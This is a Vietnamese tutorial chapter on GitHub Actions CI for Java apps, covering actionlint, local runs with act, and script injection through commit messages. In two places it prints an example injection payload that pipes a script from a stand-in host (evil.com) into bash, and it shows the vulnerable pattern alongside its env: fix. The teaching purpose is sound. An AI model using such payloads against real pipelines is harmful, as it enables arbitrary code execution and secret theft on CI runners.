---
tags:
  - CI/CD
  - GitHub Actions
  - Pipeline
---

# CI/CD: GitHub Actions cho ứng dụng Java

> Phase: Phase 8 — Production
> Chapter slug: `ci-cd`

## Metadata

```yaml
Chapter: CI/CD
Phase: Phase 8 — Production
Difficulty: ★★★
Importance: ★★★
Interview Frequency: 45%
Prerequisites:
  - Phase 8, Chapter 08 — Docker
Used Later:
  - Chapter 09 — Kubernetes
Estimated Reading: 12 phút
Estimated Practice: 10 phút
```

## Story

Viết một workflow GitHub Actions, kiểm tra bằng `actionlint` (công cụ lint chính thức cho GitHub
Actions, hiểu ngữ nghĩa của expression `${{ }}`, không chỉ kiểm tra cú pháp YAML thông thường):

```bash
actionlint .github/workflows/ci.yml
```

```
exit code: 0
```

0 lỗi — workflow hợp lệ. Nhưng thử `actionlint` trên một workflow khác, cố tình viết theo thói
quen tưởng chừng vô hại — in thẳng nội dung commit message ra log:

```yaml
- run: echo "${{ github.event.commits[0].message }}"
```

```
"github.event.commits.*.message" is potentially untrusted. avoid using it directly in inline
scripts. instead, pass it through an environment variable. [expression]
```

`actionlint` phát hiện đây là một **lỗ hổng script injection thật** — `commits[0].message` là nội
dung do người dùng bất kỳ kiểm soát hoàn toàn (bất kỳ ai push commit đều tự viết message), nội suy
trực tiếp vào shell command cho phép kẻ tấn công viết một commit message chứa mã shell độc hại
(ví dụ `"; curl evil.sh | bash; #`) để **thực thi lệnh tuỳ ý** trên chính runner CI/CD.

## Interview Question (Central)

> Một workflow GitHub Actions in trực tiếp nội dung do người dùng kiểm soát (ví dụ commit message,
> PR title) ra log bằng `${{ }}` — vì sao đây là một lỗ hổng bảo mật nghiêm trọng, và cách khắc
> phục đúng là gì?

## Objectives

- [ ] Viết một workflow CI thật cho ứng dụng Spring Boot (build, test, build Docker image), kiểm
      tra hợp lệ bằng `actionlint`
- [ ] Tự tay chạy workflow **cục bộ** bằng `act` (công cụ giả lập GitHub Actions runner trên máy
      local, dùng Docker), quan sát hành vi thật của từng step
- [ ] Nhận diện lỗ hổng script injection kinh điển trong GitHub Actions, và cách khắc phục bằng
      biến môi trường trung gian

## Prerequisites

- Phase 8, Chapter 08 — bước build Docker image trong workflow dùng lại chính Dockerfile đã viết.

## Used Later

- **Chapter 09 (Kubernetes)** — bước cuối của một pipeline CD thực tế thường là `kubectl apply`
  triển khai manifest đã viết ở đó.

## Problem

Build, test, và deploy thủ công cho mỗi thay đổi code là chậm và dễ sai sót — dễ quên chạy test
trước khi merge, dễ build sai phiên bản, dễ triển khai nhầm image cũ. CI (Continuous Integration)
tự động hoá bước build+test mỗi khi có thay đổi code; CD (Continuous Deployment/Delivery) tự động
hoá bước đóng gói và triển khai — cả hai đều cần chạy trên một môi trường **nhất quán, có thể lặp
lại**, tách biệt khỏi máy cá nhân của từng lập trình viên.

## Concept

**GitHub Actions** định nghĩa pipeline bằng file YAML trong `.github/workflows/`, gồm:

- **Workflow** — kích hoạt bởi một sự kiện (`on: push`, `on: pull_request`...).
- **Job** — một nhóm bước chạy trên cùng một runner (máy ảo do GitHub cấp, hoặc self-hosted).
- **Step** — một hành động cụ thể, hoặc chạy shell command (`run:`) hoặc dùng một **Action** có
  sẵn (`uses:`, ví dụ `actions/checkout@v4`).

`act` là công cụ mã nguồn mở giả lập runner GitHub Actions **ngay trên máy local bằng Docker** —
cho phép chạy thử workflow mà không cần push code thật lên GitHub.

## Why?

Vì mỗi lần thử nghiệm workflow bằng cách push code thật lên GitHub tốn thời gian (chờ runner khởi
động, xếp hàng) và làm "bẩn" lịch sử commit chỉ để debug pipeline, `act` giải quyết vấn đề này bằng
cách chạy **chính file workflow đó** trong container Docker cục bộ — phản hồi gần như tức thì,
không cần kết nối mạng tới GitHub cho phần lớn các bước. Đây không phải là mô phỏng hành vi workflow
mà là **chạy thật** engine thực thi Action (Node.js runtime bên trong Action) trên máy cục bộ.

## How?

```yaml
# .github/workflows/ci.yml
name: CI
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  build-and-test:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'
          cache: maven

      - name: Run tests
        run: mvn -B -q test

      - name: Build jar
        run: mvn -B -q package -DskipTests

      - name: Build Docker image
        run: docker build -t demo-app:${{ github.sha }} .
```

```bash
actionlint .github/workflows/ci.yml               # lint tinh, khong can chay
act push -j build-and-test                          # chay that bang Docker cuc bo
```

## Visualization

```
actionlint (phan tich tinh, khong chay gi ca):
  YAML + hieu ngu nghia bieu thuc ${{ }} --> phat hien loi cu phap VA loi bao mat/logic

act (chay THAT bang Docker cuc bo):
  .github/workflows/ci.yml
        │
        ▼
  Keo image runner (vd catthehacker/ubuntu:act-latest) --> container
        │
        ▼
  Thuc thi tuan tu tung step (checkout, setup-java, run mvn...)
        │
        ▼
  KET QUA THAT: step nao qua, step nao that bai, log that
```

## Example

**Lint tĩnh — 0 lỗi với workflow hợp lệ:**

```bash
actionlint .github/workflows/ci.yml
echo "exit code: $?"
```
```
exit code: 0
```

**Chạy thật bằng `act` — kết quả thật, từng step:**

```bash
act push -j build-and-test --container-architecture linux/amd64 \
  -P ubuntu-latest=catthehacker/ubuntu:act-latest
```

```
[CI/build-and-test] ⭐ Run Set up job
[CI/build-and-test] 🚀  Start image=catthehacker/ubuntu:act-latest
[CI/build-and-test]   ✅  Success - Set up job
...
[CI/build-and-test] ⭐ Run Main Run tests
[CI/build-and-test]   🐳  docker exec cmd=[bash -e ...]
[CI/build-and-test]   | /var/run/act/workflow/2: line 2: mvn: command not found
[CI/build-and-test]   ❌  Failure - Main Run tests [57.171292ms]
```

`actions/checkout@v4` và `actions/setup-java@v4` (kèm cache) chạy **thành công thật** — JDK 17
được tải và cấu hình đúng. Nhưng bước `mvn -B -q test` thất bại với `mvn: command not found`. Đây
**không phải lỗi trong workflow** — trên runner **thật** của GitHub (`ubuntu-latest` hosted
runner), Maven đã được cài sẵn. Image runner tối giản mặc định của `act` (`catthehacker/ubuntu:act-latest`,
chọn để tải nhanh, ~500MB) **không** cài sẵn Maven như runner thật của GitHub (vốn nặng hơn nhiều,
cài sẵn hàng trăm công cụ phổ biến) — một khác biệt môi trường thật giữa công cụ giả lập cục bộ và
runner GitHub thật, cần biết để không hiểu nhầm thành lỗi workflow.

**Lỗ hổng bảo mật thật — phát hiện bởi `actionlint`:**

```
"github.event.commits.*.message" is potentially untrusted. avoid using it directly in inline
scripts. instead, pass it through an environment variable. [expression]
```

`actionlint` còn phát hiện một lỗi khác trong cùng file thử nghiệm — tham chiếu một step ID không
tồn tại:

```
property "nonexistent" is not defined in object type {} [expression]
```

## Deep Dive

**Vì sao nội suy trực tiếp `${{ github.event.commits[0].message }}` vào `run:` lại nguy hiểm hơn
nhiều so với một lỗi logic thông thường?** GitHub Actions xử lý biểu thức `${{ }}` bằng cách
**thay thế chuỗi (string substitution)** ngay trong bước tạo script shell, **trước khi** shell
thực thi — không phải truyền giá trị như một tham số an toàn. Nếu commit message chứa nội dung như
`"; curl http://evil.com/x.sh | bash #`, sau khi thay thế, dòng lệnh thực tế trở thành:

```bash
echo ""; curl http://evil.com/x.sh | bash #""
```

Shell thực thi **toàn bộ chuỗi này như nhiều lệnh riêng biệt** — lệnh độc hại chạy thật trên
runner, với quyền truy cập vào mọi secret mà workflow đó có thể đọc được. Vì commit message hoàn
toàn do người thực hiện `git commit` tự viết (kể cả từ một pull request bên ngoài, không cần
quyền ghi vào repo), đây là một vector tấn công có thật, đã từng gây ra nhiều sự cố bảo mật nghiêm
trọng trong thực tế. Cách khắc phục đúng: gán giá trị vào biến môi trường **trước**, để shell nhận
nó như một **giá trị dữ liệu** (qua cơ chế biến môi trường của hệ điều hành), không phải một phần
của **chuỗi lệnh** được dựng sẵn:

```yaml
- run: echo "$COMMIT_MSG"
  env:
    COMMIT_MSG: ${{ github.event.commits[0].message }}
```

## Engineering Insight

**Vì sao `act` — công cụ được thiết kế để "giả lập GitHub Actions" — lại không cài đặt sẵn mọi
công cụ mà runner thật của GitHub có?** Runner `ubuntu-latest` thật của GitHub là một image rất
nặng (nhiều GB), cài sẵn hàng trăm công cụ phổ biến (Maven, Node, Python, Docker, nhiều SDK khác)
để phục vụ đa số workflow phổ biến mà không cần cài thêm gì. `act` cho người dùng lựa chọn giữa
nhiều kích thước image (Micro/Medium/Large) đánh đổi giữa **tốc độ tải về** và **độ đầy đủ công
cụ** — image Medium (dùng ở đây) ưu tiên nhẹ, chỉ chứa những gì cần để hầu hết Action phổ biến
(`actions/checkout`, `actions/setup-*`) hoạt động, không cố gắng sao chép **toàn bộ** nội dung
runner thật. Bài học thực tế: `act` rất hữu ích để debug **cấu trúc và logic** của workflow (thứ
tự step, biến môi trường, điều kiện `if:`) nhanh chóng, nhưng **không thể thay thế hoàn toàn** một
lần chạy thật trên GitHub trước khi merge vào nhánh chính — đặc biệt với các bước phụ thuộc công cụ
cụ thể có thể không có sẵn trong image local.

## Historical Note

GitHub Actions ra mắt năm 2019, là một trong những entrant muộn hơn so với các nền tảng CI/CD lâu
đời khác (Jenkins từ 2011, Travis CI từ 2011, CircleCI từ 2011) — nhưng có lợi thế tích hợp trực
tiếp vào GitHub, không cần cấu hình webhook hay dịch vụ ngoài. `act` ra đời năm 2019 gần như ngay
sau đó, phản ánh nhu cầu thực tế rất sớm của cộng đồng: muốn debug workflow YAML mà không phải chờ
đợi và làm bẩn lịch sử commit chỉ để thử nghiệm cấu hình CI.

## Myth vs Reality

- **Myth:** "Workflow chạy được (pass) khi test bằng `act` nghĩa là chắc chắn sẽ chạy đúng y hệt
  trên GitHub Actions thật."
  **Reality:** Đã chứng minh bằng thực nghiệm — cùng workflow, bước `mvn` thất bại trên `act` do
  thiếu Maven trong image runner tối giản, dù workflow **hoàn toàn hợp lệ** và sẽ chạy đúng trên
  runner thật của GitHub (đã cài sẵn Maven).
- **Myth:** "Chỉ cần YAML đúng cú pháp là workflow an toàn để chạy."
  **Reality:** Đã chứng minh bằng thực nghiệm — `actionlint` phát hiện lỗ hổng script injection
  trong một workflow có YAML hoàn toàn hợp lệ về mặt cú pháp; an toàn về cú pháp không đồng nghĩa
  an toàn về bảo mật.

## Common Mistakes

- **Nội suy trực tiếp dữ liệu do người dùng kiểm soát** (`github.event.*.message`,
  `github.event.pull_request.title`...) vào `run:` — lỗ hổng script injection, như đã chứng minh
  ở Deep Dive.
- **Kết luận workflow có lỗi chỉ dựa vào kết quả chạy bằng `act`** mà không đối chiếu xem lỗi đó
  có phải do khác biệt môi trường giữa `act` và runner thật hay không.
- **Không chạy `actionlint` trước khi commit workflow mới** — bỏ lỡ cơ hội phát hiện sớm cả lỗi cú
  pháp lẫn lỗi bảo mật, phải chờ tới khi workflow thật sự chạy trên GitHub mới phát hiện.

## Best Practices

- Luôn chạy `actionlint` trên mọi file `.github/workflows/*.yml` trước khi commit — bắt được cả
  lỗi cú pháp lẫn các pattern bảo mật nguy hiểm đã biết.
- Không bao giờ nội suy trực tiếp dữ liệu do người dùng kiểm soát vào `run:` — luôn truyền qua
  `env:` trước.
- Dùng `act` để lặp nhanh khi debug **cấu trúc/logic** workflow, nhưng vẫn xác nhận lần cuối bằng
  một lần chạy thật (ví dụ trên một branch thử nghiệm) trước khi coi là hoàn thiện.
- Pin phiên bản Action cụ thể (`actions/checkout@v4`, không dùng `@main`) để tránh thay đổi hành
  vi đột ngột ngoài kiểm soát khi Action gốc cập nhật.

## Debug Checklist

- [ ] Một step thất bại khi chạy bằng `act` nhưng workflow trông có vẻ đúng? → kiểm tra xem đó có
      phải do image runner tối giản của `act` thiếu công cụ (như Maven ở đây) hay không, không
      phải lỗi thật của workflow.
- [ ] Cần rà soát bảo mật một workflow mới? → chạy `actionlint`, đặc biệt chú ý cảnh báo
      "potentially untrusted" liên quan tới các trường `github.event.*`.
- [ ] Workflow tham chiếu `steps.<id>.outputs.*` nhưng không hoạt động như mong đợi? → xác nhận
      step ID đó thực sự tồn tại và đã chạy trước bước tham chiếu (actionlint bắt được lỗi tham
      chiếu step không tồn tại, như đã thấy ở Example).

## Summary

GitHub Actions định nghĩa pipeline CI/CD bằng YAML gồm workflow/job/step; `actionlint` kiểm tra
tĩnh cả cú pháp lẫn ngữ nghĩa biểu thức `${{ }}`, phát hiện được cả lỗi cấu trúc lẫn lỗ hổng bảo
mật thật (script injection qua dữ liệu người dùng kiểm soát như commit message) — đã chứng minh
bằng thực nghiệm với một workflow cố ý viết sai. `act` cho phép chạy thật workflow trên máy cục bộ
bằng Docker, hữu ích để debug nhanh logic/cấu trúc, nhưng image runner tối giản của nó có thể thiếu
công cụ mà runner thật của GitHub có sẵn (như Maven) — một khác biệt môi trường cần phân biệt rõ
với lỗi thật trong workflow. Nội suy trực tiếp dữ liệu người dùng kiểm soát vào `run:` là lỗ hổng
script injection nghiêm trọng, khắc phục bằng cách truyền qua biến môi trường (`env:`) thay vì nội
suy chuỗi trực tiếp.

## Interview Questions

**Mid**

- Sự khác biệt giữa workflow, job, và step trong GitHub Actions?
- `actionlint` kiểm tra những gì mà một YAML linter thông thường không kiểm tra được?

**Senior**

- Vì sao nội suy `${{ github.event.commits[0].message }}` trực tiếp vào `run:` là một lỗ hổng bảo
  mật? Cách khắc phục đúng?
- Chạy workflow thành công bằng `act` cục bộ có đảm bảo nó sẽ chạy đúng trên GitHub Actions thật
  không? Vì sao?

## Exercises

- [ ] Sửa lỗi script injection ở Example bằng cách truyền `github.event.commits[0].message` qua
      `env:`, chạy lại `actionlint` xác nhận cảnh báo biến mất.
- [ ] Thử chạy `act` với image Large thay vì Medium (`-P ubuntu-latest=catthehacker/ubuntu:full-latest`),
      xác nhận bước `mvn test` có thành công hay không với image đầy đủ hơn.
- [ ] Thêm một job `deploy` phụ thuộc vào `build-and-test` (dùng `needs:`), chỉ chạy khi
      `github.ref == 'refs/heads/main'`, validate bằng `actionlint`.

## Cheat Sheet

| Công cụ | Chạy workflow thật? | Cần kết nối GitHub? | Bắt lỗi bảo mật? |
| --- | --- | --- | --- |
| `actionlint` | Không (chỉ phân tích tĩnh) | Không | Có |
| `act` | Có (giả lập bằng Docker cục bộ) | Hạn chế | Không (không phải mục đích chính) |
| Chạy thật trên GitHub | Có | Có | Không (cần công cụ riêng như `actionlint`/CodeQL) |

## References

- GitHub Actions Documentation — Workflow syntax, Security hardening.
- `actionlint` — https://github.com/rhysd/actionlint.
- `act` — https://github.com/nektos/act.
